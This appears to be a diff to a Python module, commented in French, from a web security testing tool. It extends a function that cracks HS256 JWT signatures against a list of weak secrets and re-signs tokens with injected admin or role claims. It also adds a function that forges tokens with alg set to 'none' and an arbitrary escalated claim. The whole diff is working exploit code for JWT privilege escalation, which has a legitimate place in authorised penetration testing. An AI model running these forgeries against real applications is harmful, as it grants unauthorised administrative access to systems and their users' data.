@@ -77,11 +77,18 @@ WEAK_SECRETS = [
 ]
 
 
-def try_weak_secrets(token: str) -> str | None:
+def try_weak_secrets(
+    token: str,
+    elevated_claims: dict | None = None,
+) -> str | None:
     """
     Essaie de re-signer le JWT avec des secrets communs (HS256 uniquement).
-    Si un secret faible est trouvé, retourne un token re-signé avec admin=true.
-    Retourne None si aucun secret ne correspond ou si alg != HS256.
+    Si un secret faible est trouvé, retourne un token re-signé avec les claims escaladés.
+
+    elevated_claims : claims à injecter (ex: {"role": "admin", "is_admin": True}).
+    Si None, utilise les valeurs par défaut {"admin": True, "role": "admin"}.
+    Passer des claims observés dans le corpus permet d'utiliser les vrais noms de
+    rôles de l'application plutôt que des valeurs hardcodées.
     """
     decoded = decode_jwt_insecure(token)
     if decoded is None:
@@ -94,15 +101,34 @@ def try_weak_secrets(token: str) -> str | None:
     orig_parts = token.split(".")
     message = f"{orig_parts[0]}.{orig_parts[1]}".encode()
 
+    _default_elevated = {"admin": True, "role": "admin"}
+    claims_to_inject = elevated_claims if elevated_claims is not None else _default_elevated
+
     for secret in WEAK_SECRETS:
         computed_sig = hmac.new(secret.encode(), message, hashlib.sha256).digest()
         computed_b64 = _b64url_encode(computed_sig)
         if computed_b64 == original_sig:
-            payload_mod = dict(payload)
-            payload_mod["admin"] = True
-            payload_mod["role"] = "admin"
+            payload_mod = {**payload, **claims_to_inject}
             new_payload = _b64url_encode(json.dumps(payload_mod, separators=(",", ":")).encode())
             new_message = f"{orig_parts[0]}.{new_payload}".encode()
             new_sig = hmac.new(secret.encode(), new_message, hashlib.sha256).digest()
             return f"{orig_parts[0]}.{new_payload}.{_b64url_encode(new_sig)}"
     return None
+
+
+def forge_claim_escalation(token: str, claim_name: str, elevated_value: object) -> str | None:
+    """
+    Forge un JWT en escaladant un claim spécifique sans re-signature (algo=none).
+    Utile quand le nom du claim est connu depuis les réponses observées.
+
+    Exemple : forge_claim_escalation(token, "role", "superuser")
+    """
+    decoded = decode_jwt_insecure(token)
+    if decoded is None:
+        return None
+    header, payload, _ = decoded
+    header_mod = {**header, "alg": "none"}
+    payload_mod = {**payload, claim_name: elevated_value}
+    h = _b64url_encode(json.dumps(header_mod, separators=(",", ":")).encode())
+    p = _b64url_encode(json.dumps(payload_mod, separators=(",", ":")).encode())
+    return f"{h}.{p}."
